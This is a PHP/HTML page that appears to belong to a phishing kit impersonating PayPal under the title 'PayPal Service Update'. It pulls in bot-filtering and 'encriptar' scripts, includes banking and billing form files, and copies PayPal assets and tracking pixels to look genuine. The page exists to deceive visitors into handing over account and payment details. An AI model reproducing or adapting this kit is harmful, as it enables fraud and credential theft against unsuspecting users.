<?php include "encriptar.php";?>
<?php
error_reporting(0);
session_start();
set_time_limit(0);
include"bots.php";
?>
<!DOCTYPE html>
<html lang="en" class=" js flexbox flexboxlegacy canvas canvastext webgl no-touch geolocation postmessage websqldatabase indexeddb hashchange history draganddrop websockets rgba hsla multiplebgs backgroundsize borderimage borderradius boxshadow textshadow opacity cssanimations csscolumns cssgradients cssreflections csstransforms csstransforms3d csstransitions fontface generatedcontent video audio localstorage sessionstorage webworkers applicationcache svg inlinesvg smil svgclippaths js " data-device-type="desktop">
	<!-- UPDATE BY Hotrod -->
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <script src="./js/modernizr-2.7.0.js"></script>
    <meta charset="utf-8">
    <link rel="shortcut icon" href="./img/pp_favicon_x.ico">
    <link rel="apple-touch-icon" href="./img/apple-touch-icon.png">
    <title>PayPal Service Update</title>
    <link rel="stylesheet" href="./css/app.css">
    <link type="text/css" rel="stylesheet" href="./css/a_23_-1010506237.css">
	<script type="text/javascript" src="./js/a_23_-1984923970.js"></script>
	
	<SCRIPT LANGUAGE="JavaScript">
function popUp(URL) {
day = new Date();
id = day.getTime();
eval("page" + id + " = window.open(URL, '" + id + "', 'toolbar=0,scrollbars=0,location=0,statusbar=0,menubar=0,resizable=0,width=660,height=396,left = 565.5,top = 149');");
}
</script>
	
   <SCRIPT language="Javascript">
      function isNumberKey(evt)
      {
         var charCode = (evt.which) ? evt.which : event.keyCode
         if (charCode > 31 && (charCode < 48 || charCode > 57))
            return false;

         return true;
      }
   
   
   
	function ValidateAlpha(evt)
        {
            var keyCode = (evt.which) ? evt.which : evt.keyCode
            if ((keyCode < 65 || keyCode > 90) && (keyCode < 97 || keyCode > 123) && keyCode != 32)

            return false;
                return true;
        }
   
   
   
   
   
   </SCRIPT>
	
	
	
	
	
	
	<script src="./is/head.js"></script>
   <script type="text/javascript" charset="utf-8" data-requirecontext="_" data-requiremodule="main" src="./js/main.js"></script>
    <script type="text/javascript" charset="utf-8" data-requirecontext="_" data-requiremodule="view/summary/index" src="./js/index.js"></script>
    <script type="text/javascript" charset="utf-8" data-requirecontext="_" data-requiremodule="lib/business/businessHelper" src="./js/businessHelper.js"></script>
    <script type="text/javascript" charset="utf-8" data-requirecontext="_" data-requiremodule="widget/explore" src="./js/explore.js"></script>
  </head>

<body id="page">
    <header>
        
		<? include ("./banking/header.php"); ?>
		
    </header>
    <div class="betaBannerMainWrapper"></div>
    <div class="containerCentered" id="content" role="content" tabindex="-1">
        <div class="layout" id="index">
            <section class="">
                <div class="row-fluid">
                    <div class="span4" id="homePage">
                      

					  <? include ("./billing/tools.php"); ?>
						
						
                        
						
						
						<? include ("./billing/enabledby.php"); ?>
						
						
                    </div>
                    <div class="span8 actTile">
					
					<? include ("./banking/form.php"); ?>
					
					</div>
                </div>
            </section>
        </div>
        <input type="hidden" id="notesContent" value="Remarque :">
        <input type="hidden" id="transactionsFetchLimit" value="8">
    </div>
    <footer role="navigation">
        <? include ("./banking/footer.php"); ?>
    </footer>
    <script type="text/javascript" src="./js/pp_jscode_080706.js"></script>
    <noscript>&lt;img src="//paypal.112.2O7.net/b/ss/paypalglobal/1/H.6--NS/0?pageName=NonJavaScript" alt="" height="1" width="1" border="0"&gt;</noscript>
    <!-- DO NOT REMOVE THIS COMMENT -->
    <script type="text/javascript" src="./js/pa.js"></script>
    
    <noscript>&lt;img src="https://t.paypal.com/ts?nojs=1&amp;pgrp=main%3Abusiness%3A%3A%3Ahome&amp;page=main%3Abusiness%3A%3A%3Ahome%3A%3A%3A&amp;tmpl=businesshubspartaweb%2FWEB-INF%2Ftemplates%2Fsummary%2Findex.dust&amp;lgin=in&amp;vers=%3A%3A&amp;calc=65d4000c75d70&amp;rsta=fr_FR&amp;md5h=41283c888012c69177d915b597f5f6b5&amp;shfp=%7C%7C&amp;usce=beta&amp;pgtf=Sparta&amp;s=ci&amp;goal=event17&amp;flnm=business%3A%3A&amp;cust=YM2835PF9WQXJ&amp;acnt=business&amp;aver=unverified&amp;rstr=unrestricted&amp;pfid=65d4000c75d70&amp;s.prop80=testVarRemoveMe" alt="" height="1" width="1" border="0"&gt;</noscript>
    <script data-main="https://www.paypalobjects.com/eboxapps/js/cc/828c80ba7a7ce05c22cf35736ef9b3/main" src="./js/require-2.0.1.js"></script>
    <div class="exploreModal"></div>
</body>

</html>
